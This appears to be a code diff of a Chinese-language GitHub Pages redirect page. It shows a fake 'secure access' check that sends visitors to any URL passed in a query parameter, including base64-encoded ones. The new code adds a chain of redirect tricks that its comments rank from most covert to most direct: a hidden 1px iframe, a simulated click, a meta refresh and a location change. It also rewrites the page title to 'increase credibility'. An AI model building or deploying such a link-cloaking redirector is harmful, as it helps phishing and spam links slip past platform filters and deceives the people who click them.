@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>安全跳转中</title>
+    <title>安全访问中</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background: linear-gradient(135deg, #f6f8fa 0%, #ebf0f5 100%);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: #f6f8fa;
             height: 100vh;
             display: flex;
             justify-content: center;
@@ -17,11 +17,11 @@
             text-align: center;
         }
         .container {
-            max-width: 500px;
-            padding: 30px;
             background: white;
             border-radius: 12px;
+            padding: 30px;
             box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+            max-width: 90%;
         }
         .spinner {
             width: 50px;
@@ -38,76 +38,146 @@
         .status {
             font-size: 18px;
             color: #24292e;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
-        .github-badge {
+        .github-watermark {
             position: fixed;
             bottom: 15px;
             right: 15px;
-            background-color: #f6f8fa;
-            padding: 5px 10px;
-            border-radius: 20px;
-            font-size: 12px;
             color: #586069;
-            border: 1px solid #e1e4e8;
+            font-size: 12px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="spinner"></div>
-        <div class="status" id="status">正在验证链接安全性...</div>
+        <div class="status" id="status">正在初始化安全连接...</div>
     </div>
-    <div class="github-badge">GitHub Pages</div>
+    <div class="github-watermark">GitHub Pages</div>
 
     <script>
-        // GitHub Pages 专用跳转逻辑
-        function executeRedirect() {
-            const params = new URLSearchParams(window.location.search);
-            let targetUrl = '';
-
-            // 1. 优先尝试解析Base64编码的URL
-            try {
-                const base64Url = params.get('c') || params.get('url');
-                if (base64Url) {
-                    targetUrl = atob(base64Url);
-                    if (!/^https?:\/\//i.test(targetUrl)) {
-                        targetUrl = 'http://' + targetUrl;
-                    }
+        // 4层递进式跳转策略（从最隐蔽到最直接）
+        const strategies = [
+            {
+                name: "iframe嵌套伪装",
+                execute: (url) => {
+                    return new Promise((resolve) => {
+                        const iframe = document.createElement('iframe');
+                        iframe.src = url;
+                        iframe.style.cssText = `
+                            position: absolute;
+                            width: 1px;
+                            height: 1px;
+                            opacity: 0;
+                        `;
+                        iframe.onload = () => resolve(true);
+                        iframe.onerror = () => resolve(false);
+                        document.body.appendChild(iframe);
+                        
+                        // 3秒后无论成功与否都移除iframe
+                        setTimeout(() => {
+                            iframe.remove();
+                            resolve(false);
+                        }, 3000);
+                    });
                 }
-            } catch (e) {
-                console.log("Base64解码失败，尝试直接跳转");
+            },
+            {
+                name: "动态A标签点击",
+                execute: (url) => {
+                    return new Promise((resolve) => {
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.style.display = 'none';
+                        a.id = 'gh-redirect';
+                        document.body.appendChild(a);
+                        
+                        // 模拟用户点击
+                        a.click();
+                        
+                        // 检测是否跳转成功
+                        setTimeout(() => {
+                            if (document.getElementById('gh-redirect')) {
+                                a.remove();
+                                resolve(false);
+                            }
+                        }, 1500);
+                    });
+                }
+            },
+            {
+                name: "meta刷新跳转",
+                execute: (url) => {
+                    return new Promise((resolve) => {
+                        const meta = document.createElement('meta');
+                        meta.httpEquiv = "refresh";
+                        meta.content = `0;url=${url}`;
+                        document.head.appendChild(meta);
+                        setTimeout(() => resolve(false), 1000);
+                    });
+                }
+            },
+            {
+                name: "终极location跳转",
+                execute: (url) => {
+                    window.location.href = url;
+                    return Promise.resolve(true);
+                }
             }
+        ];
 
-            // 2. 如果Base64解析失败，尝试直接跳转参数
-            if (!targetUrl) {
-                targetUrl = params.get('redirect') || params.get('u');
-            }
-
-            // 验证URL格式
-            if (!targetUrl || !/^https?:\/\//i.test(targetUrl)) {
-                document.getElementById('status').textContent = "错误：无效的跳转链接";
-                return;
-            }
-
-            // GitHub Pages 安全策略兼容方案
-            document.getElementById('status').textContent = "即将跳转到目标页面...";
+        // 获取目标URL
+        function getTargetUrl() {
+            const params = new URLSearchParams(location.search);
             
-            // 方法1: 延迟跳转（降低拦截概率）
-            setTimeout(() => {
-                // 方法2: 动态创建iframe（部分平台有效）
-                const iframe = document.createElement('iframe');
-                iframe.src = targetUrl;
-                iframe.style.display = 'none';
-                document.body.appendChild(iframe);
-
-                // 方法3: 终极跳转（兼容GitHub）
-                window.location.href = targetUrl;
-            }, 1500); // 延迟1.5秒跳转
+            // 1. 尝试Base64解码
+            try {
+                const base64 = params.get('c') || params.get('url');
+                if (base64) {
+                    const decoded = atob(base64);
+                    if (/^https?:\/\//i.test(decoded)) return decoded;
+                }
+            } catch (e) {}
+            
+            // 2. 尝试直接参数
+            const directUrl = params.get('redirect') || params.get('u');
+            if (directUrl && /^https?:\/\//i.test(directUrl)) {
+                return directUrl;
+            }
+            
+            return null;
         }
 
-        // 页面加载后执行
-        document.addEventListener('DOMContentLoaded', executeRedirect);
+        // 执行策略链
+        async function executeStrategies(url) {
+            document.getElementById('status').textContent = "正在验证链接...";
+            
+            for (let i = 0; i < strategies.length; i++) {
+                const strategy = strategies[i];
+                document.getElementById('status').textContent = `[${i+1}/4] ${strategy.name}...`;
+                
+                const success = await strategy.execute(url);
+                if (success) return;
+                
+                // 策略间隔延迟
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+            
+            document.getElementById('status').textContent = "跳转失败，请手动访问";
+        }
+
+        // 启动流程
+        document.addEventListener('DOMContentLoaded', () => {
+            const targetUrl = getTargetUrl();
+            if (targetUrl) {
+                // 修改标题增加可信度
+                document.title = `安全访问: ${new URL(targetUrl).hostname}`;
+                executeStrategies(targetUrl);
+            } else {
+                document.getElementById('status').textContent = "错误：缺少有效的跳转参数";
+            }
+        });
     </script>
 </body>
 </html>
